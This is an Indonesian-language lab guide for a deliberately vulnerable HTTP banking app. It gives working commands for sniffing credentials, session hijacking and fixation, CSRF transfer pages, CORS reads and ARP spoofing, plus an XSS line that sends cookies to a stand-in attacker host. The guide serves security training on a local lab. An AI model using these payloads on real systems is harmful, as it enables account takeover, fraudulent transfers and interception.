# HTTP Lab — Penyadapan, Session Hijacking, dan CSRF

Dokumen ini menjelaskan cara memanfaatkan kenyataan bahwa Bank UBS berjalan
**HTTP tanpa TLS**. Semua contoh hanya untuk lab terisolasi milik Anda.

---

## 1. Topologi

```text
Browser / attacker                Server lab
┌──────────────────┐   HTTP    ┌──────────────────────────┐
│ 127.0.0.1:3001   │ ────────▶ │ Express + SQLite         │
│ (atau host lain) │  plaintext│ /api/auth/login          │
└──────────────────┘           │ cookie sid (non-HttpOnly)│
                               └──────────────────────────┘
```

Tidak ada:

- HTTPS / TLS
- HSTS
- redirect HTTP → HTTPS
- cookie `Secure`
- cookie `HttpOnly`
- CSRF token
- rate limit login

Yang ada:

- login JSON plaintext: `{"username":"budi","password":"budi123"}`
- cookie `sid` dikirim di setiap request
- token session juga dikembalikan di body login (`session_id`)
- Basic Auth legacy di `/api/auth/legacy` (base64, bukan enkripsi)
- log server menyimpan username/password
- backup DB dan log dapat diunduh tanpa autentikasi

---

## 2. Capture dengan Wireshark

### Windows

1. Install [Npcap](https://npcap.com/) dengan opsi loopback support.
2. Buka Wireshark, pilih interface **Adapter for loopback traffic capture**
   (`\Device\NPF_Loopback`) jika browser dan server di mesin yang sama.
3. Mulai capture.
4. Login di `http://127.0.0.1:3001/login`.
5. Hentikan capture.

Jika loopback tidak tersedia, jalankan browser dari mesin lain di jaringan lab
dan capture di interface Ethernet/Wi-Fi server.

### Linux

```bash
sudo tcpdump -i lo -A port 3001
# atau
sudo wireshark
```

### Filter yang berguna

```text
http.request.method == "POST" && http.request.uri == "/api/auth/login"
http contains "budi123"
http contains "password"
http.cookie
http.authorization
http.response.code == 302
```

### Yang akan terlihat

Request:

```http
POST /api/auth/login HTTP/1.1
Host: 127.0.0.1:3001
Content-Type: application/json
Content-Length: 43

{"username":"budi","password":"budi123"}
```

Response:

```http
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Set-Cookie: sid=xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx; Max-Age=604800; Path=/; SameSite=Lax

{"success":true,"user":{...},"token":"eyJ...","session_id":"..."}
```

Klik kanan request → **Follow → HTTP Stream** untuk melihat semuanya sekaligus.

### Basic Auth legacy

```bash
curl -v -u budi:budi123 http://127.0.0.1:3001/api/auth/legacy
```

Header `Authorization: Basic YnVkaTpidWRpMTIz` hanya base64. Wireshark dapat
men-decode otomatis atau gunakan:

```bash
echo YnVkaTpidWRpMTIz | base64 -d
```

---

## 3. Session Hijacking

Cookie sengaja dibuat:

```js
{
  httpOnly: false,   // bisa dibaca JavaScript
  secure: false,     // dikirim lewat HTTP
  sameSite: 'lax',
  path: '/',
  maxAge: 7 * 24 * 60 * 60 * 1000
}
```

### 3.1 Curl dengan cookie curian

Setelah capture, ambil nilai `sid` lalu:

```bash
curl -s http://127.0.0.1:3001/api/auth/me \
  -H "Cookie: sid=<SID_DARI_WIRESHARK>"
```

### 3.2 Baca cookie lewat XSS

Stored XSS di notes/support atau reflected XSS di login dapat menjalankan:

```html
<img src=x onerror="fetch('http://attacker.test/?c='+document.cookie)">
```

Karena `httpOnly:false`, `document.cookie` berisi `sid=...`.

### 3.3 Logout tidak mematikan session

```bash
# login dan simpan cookie
curl -s -c jar.txt -X POST http://127.0.0.1:3001/api/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"budi","password":"budi123"}'

# logout
curl -s -b jar.txt -X POST http://127.0.0.1:3001/api/auth/logout

# cookie lama masih valid di server
curl -s -b jar.txt http://127.0.0.1:3001/api/auth/me
```

Server hanya menghapus cookie di browser; row `sessions` tidak dihapus.

### 3.4 Session fixation

```bash
# 1. Penyerang membuat session kosong dengan SID yang diketahui
curl -s -c fix.txt "http://127.0.0.1:3001/api/auth/session?sid=attacker-fixed-sid"

# 2. Korban login memakai SID tersebut (mis. link yang sudah disiapkan)
curl -s -b fix.txt -X POST http://127.0.0.1:3001/api/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"budi","password":"budi123","sid":"attacker-fixed-sid"}'

# 3. Penyerang memakai SID yang sama
curl -s -H "Cookie: sid=attacker-fixed-sid" http://127.0.0.1:3001/api/auth/me
```

---

## 4. CSRF

Tidak ada token CSRF. Endpoint transfer bahkan menerima **GET**:

```http
GET /api/transfer?from_id=1&to_id=2&amount=100000&note=csrf HTTP/1.1
Host: 127.0.0.1:3001
Cookie: sid=<korban>
```

Cookie `SameSite=Lax` hanya dikirim pada navigasi **top-level GET**, bukan
subresource seperti `<img>`. Jadi gunakan redirect top-level:

```html
<!-- csrf.html — buka saat korban sudah login -->
<script>
  location = 'http://127.0.0.1:3001/api/transfer?from_id=1&to_id=2&amount=100000&note=csrf';
</script>
```

Atau form otomatis (juga top-level):

```html
<form id="f" action="http://127.0.0.1:3001/api/transfer" method="GET">
  <input name="from_id" value="1" />
  <input name="to_id" value="2" />
  <input name="amount" value="100000" />
  <input name="note" value="csrf" />
</form>
<script>document.getElementById('f').submit()</script>
```

Server mencerminkan `Origin` dan mengirim
`Access-Control-Allow-Credentials: true`. Contoh endpoint admin ini memang
tidak memerlukan autentikasi, sehingga JavaScript lintas origin dapat membaca
data. Untuk endpoint yang memakai cookie, `SameSite=Lax` membatasi pengiriman
cookie pada navigasi cross-site; origin berbeda port di host yang sama tetap
berguna untuk mendemokan CORS credentials:

```js
fetch('http://127.0.0.1:3001/api/admin/users')
  .then((r) => r.json())
  .then(console.log);
```

---

## 5. MITM (ARP Spoof / Proxy)

Di lab yang terisolasi, Anda dapat menempatkan diri di antara browser dan server:

- **mitmproxy** sebagai explicit proxy:
  ```bash
  mitmproxy -p 8080
  # arahkan browser ke proxy 127.0.0.1:8080
  ```
- **ARP spoofing** di jaringan lab (hanya jika Anda berwenang):
  ```bash
  sudo ettercap -T -M arp:remote /victim-ip/ /server-ip/
  ```
- **Wireshark** pada switch port mirror / host server.

Karena tidak ada TLS, tidak ada certificate pinning atau HSTS yang menghalangi.
Credential, cookie, dan isi transaksi terlihat apa adanya.

---

## 6. Reset Setelah Latihan

```bash
npm run lab:reset
```

Default:

- backup ke `lab/evidence/<timestamp>/`
- prune evidence > 30 hari
- hapus DB, uploads, logs, exports, backups
- seed ulang data awal
- autostart server

Opsi:

```bash
npm run lab:reset -- --no-backup
npm run lab:reset -- --no-start
npm run lab:reset -- --foreground
npm run lab:reset -- --no-prune
```

Jika RCE sudah dijalankan di host:

```bash
# Setelah pekerjaan di-commit, ini mengembalikan source ke HEAD
npm run lab:reset -- --hard --yes

# Alternatif yang lebih aman untuk lingkungan Docker
npm run lab:docker:reset
```

`--hard` menjalankan `git restore` dan `git clean`; **semua perubahan yang belum
di-commit akan hilang**. Jangan jalankan sebelum menyimpan pekerjaan.

---

## 7. Verifikasi Cepat

```bash
npm run lab:reset
npm run lab:verify
```

`lab:verify` menguji 47 perilaku (SQLi, XSS, IDOR, SSRF, XXE, SSTI, command
injection, JWT none, prototype pollution, race condition, dll). Script ini
mengubah data lab; reset lagi setelah selesai.

---

## 8. Troubleshooting Wireshark

| Masalah | Solusi |
|---------|--------|
| Tidak ada traffic loopback | Install Npcap dengan loopback; pilih interface `NPF_Loopback` |
| Hanya melihat TCP, bukan HTTP | Pastikan port 3001, bukan 443; decode as HTTP |
| Browser memakai cache | Hard reload / disable cache di DevTools |
| Tidak ada password | Pastikan login lewat form, bukan token lama |
| Ingin melihat cookie | Filter `http.cookie` atau follow stream response login |
| Server tidak jalan | `npm run lab:status`, lalu `npm run lab:reset` |

---

## 9. Etika

Dokumen ini untuk lab yang Anda miliki atau yang Anda punya izin tertulis untuk
diuji. Penyadapan jaringan tanpa izin adalah tindakan ilegal. Jangan gunakan
payload atau teknik di sini terhadap sistem pihak ketiga.
